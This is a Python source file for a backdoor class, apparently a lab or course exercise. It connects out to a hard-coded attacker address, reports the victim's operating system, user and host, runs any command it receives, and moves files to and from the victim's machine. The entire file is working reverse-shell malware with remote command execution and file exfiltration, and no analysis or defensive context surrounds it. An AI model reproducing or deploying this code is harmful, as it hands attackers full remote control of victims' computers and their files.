import io
import socket
import subprocess
import json
import os
import base64
import sys
import platform


class Backdoor:
    def __init__(self, ipv4, port):
        """
        A standard ctor for backdoor object,
        creates a socket, and connecting to attacker

        :param ipv4: attacker source port
        :type ipv4: str

        :param port: port that attacker opened
        :type port: int
        """
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        self.connection.connect((ipv4, port))

    def send(self, data) -> None:
        """
        this function reliably sends data, serializing it using json

        :param data:
        :type data: list | str | bytes
        """
        json_data = json.dumps(data.decode())
        self.connection.sendall(json_data.encode())

    def recv(self) -> str:
        """
        this function reliably receives data

        :return: backdoors data
        :rtype: str
        """
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(io.DEFAULT_BUFFER_SIZE)
                return json.loads(json_data)
            except ValueError:
                continue

    @staticmethod
    def exec(command) -> bytes:
        """
        this function executes terminal commands that received from attacker

        :param command: command to execute
        :type command: str

        :return: the output of the command
        :rtype: bytes
        """
        return subprocess.check_output(command)

    @staticmethod
    def detect_os() -> str:
        """
        this function detects the operating system that target runs

        :return: "<OS> <Model> <Build-version>"
        :rtype: str
        """
        if platform.system() == "Windows":
            model = platform.release()
            build_version = platform.win32_ver()[1]
            result = f"Windows {model} Build {build_version}"
        elif platform.system() == "Linux":
            with open("/etc/os-release", "r") as f:
                lines = f.readlines()
            distribution = ""
            version = ""
            for line in lines:
                if line.startswith("NAME="):
                    distribution = line.split("=")[1].strip().strip('"')
                elif line.startswith("VERSION_ID="):
                    version = line.split("=")[1].strip().strip('"')
            if distribution and version:
                result = f"Linux {distribution} {version}"
            else:
                result = "Failed to retrieve Linux distribution and version"
        elif platform.system() == "Darwin":
            mac_ver = platform.mac_ver()
            version = mac_ver[0]
            result = f"macOS {version}"
        else:
            result = "Not a Windows, Linux, or macOS operating system"

        return result

    def process_exit(self) -> None:
        """
        this function process the case we want to close the connection,
        both shutdowns and closes sockets
        """
        self.connection.shutdown(socket.SHUT_RDWR)
        self.connection.close()
        sys.exit(0)

    @staticmethod
    def change_directory(path) -> bytes:
        """
        this file executes the `cd` command to change directory

        :param path: new path to move to
        :type path: str

        :return: string of new location on machine
        :rtype: bytes
        """
        os.chdir(path)
        return b""

    @staticmethod
    def read_file(path) -> bytes:
        """
        this function reads contents of a file

        :param path: path to file
        :type path: str

        :return: full contents of file in bytes
        """
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    @staticmethod
    def write_file(path, content) -> str:
        """
        this function writes into a file

        :param path: path to a file to write
        :type path: str

        :param content: content to write into file
        :type content: str

        :return: success message
        :rtype: str
        """
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "Downloaded successfully.\n"

    def run(self) -> None:
        result = b""
        self.send(self.detect_os().encode())
        while True:
            try:

                self.send(f"{self.exec('whoami').decode()}@{self.exec('hostname').decode()}:{self.exec('pwd').decode()}".encode())

                command = self.recv()

                if command[0] == "exit" or command == "exit":
                    self.process_exit()

                elif command[0] == "cd":
                    result = self.change_directory(command[1])

                elif command[0] == "download":
                    result = self.read_file(command[1])

                elif command[0] == "upload":
                    result = self.write_file(command[1], command[2])

                else:
                    result = self.exec(command)

                self.send(result)

            except Exception as e:
                result = f"(Backdoor)Error: {e}.".encode() + b"\n"
                self.send(result)


if __name__ == "__main__":
    my_backdoor = Backdoor("10.9.0.3", 3000)
    my_backdoor.run()
